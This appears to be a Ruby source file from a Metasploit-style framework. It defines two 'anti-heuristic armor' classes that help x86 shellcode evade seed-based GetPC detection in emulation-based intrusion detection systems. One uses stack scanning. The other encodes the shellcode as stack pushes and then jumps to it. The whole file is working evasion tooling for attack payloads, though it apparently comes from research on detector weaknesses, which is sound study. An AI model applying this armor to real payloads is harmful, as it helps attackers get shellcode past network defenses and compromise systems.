# -*- coding: binary -*-

# =============================================================
# GetPC seed instruction detection evasion armoring classes
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # Anti-heuristics class for evasion of seed-based GetPC detection
  class GetPC_StackScan < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'GetPC StackScan',  
        'ID'               => 5,             
        'Description'      => 'Anti-GetPC detection armor integrating stack scanning',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # getPC stub evading seed-instruction based detection
    #
    # [+] Features:
    #       + Lightly polymorphic
    #
    # [-] Limitations:
    #       - This only works when executed from the stack
    #
    # [*] Note:
    #       - This can be futher improved by additional polymorphism
    #       - Can be prefixed by Rex::Arch::x86.copy_to_stack for more reliability/less limitations
    #
    def getPCStub(getPCDestReg)
      stub = Ebnids::GetPCStub.stackScanGetPC(getPCDestReg, @module_metadata['badchars'])
      return stub
    end

  end

  # Anti-heuristics class for evasion of seed-based GetPC detection
  # Implemented to evade PRT heuristic as well
  class GetPC_StackConstruct < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'GetPC StackConstructor',  
        'ID'               => 6,             
        'Description'      => 'Anti-GetPC detection armor using stack-constructed shellcode',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 1,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    def getPCStub(getPCDestReg)
      # Stand-in 'GetPC' code (since esp = PC when the code gets run)
      return Rex::Arch::X86.mov_reg(getPCDestReg, Rex::Arch::X86::ESP) +
             Rex::Arch::X86.sub(-5, getPCDestReg, @module_metadata['badchars'], false, true)
    end

    #
    # Custom encoding to push (encoded) shellcode to the stack and execute from there
    #
    # [-] Limitations:
    #      - Not polymorphic
    #      - Might be incompatible with some (rare) shellcodes presuming large amount of data can be written to preceding stack (due to overwriting issues)
    #
    # [*] Note:
    #      - This can be further improved by applying polymorphism
    #      - This can be further improved by letting caller specify desired amount of prepended stackspace
    #
    def encode(buf)
      badchars = @module_metadata['badchars']
      # Additional stackspace to take into account initial shellcode instructions assuming some stackspace to work with (eg. FNSTENV storing record on stack)
      stackSpaceCount = 28
      stackSpace = Rex::Text.rand_text(stackSpaceCount, badchars)

      # Prepend stackSpace to buf (which is getpc_stub + decoder_stub + encoded body)
      buf = stackSpace + buf

      # Align buf to DWORD size (for subsequent conversion to stack-pushed blocks)
      if (buf.length % 4 != 0)
        #TODO: report error if max_len is exceeded through padding?
        #if ((buf.length + (4 - (buf.length % 4))) > max_len)
        #  error
        #end
        buf = buf + Rex::Text.rand_text((4 - (buf.length % 4)), badchars)
      end

      # Chop buffer into blocks of 4 (we can use {4} since buf is DWORD-aligned)
      blocks = buf.scan(/.{4}/)

      # Push in reverse order to stack
      construction_stub = ""
      blocks.reverse.each { |x| construction_stub = construction_stub + "\x68" + x } # push(x)

      # Transfer control to (ESP + stackSpaceCount) after pushing is done
      construction_stub = construction_stub + 
                          Rex::Arch::X86.sub(-(stackSpaceCount), Rex::Arch::X86::ESP, badchars, false, true) +
                          Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(Rex::Arch::X86::ESP))

      return construction_stub
    end

  end

end
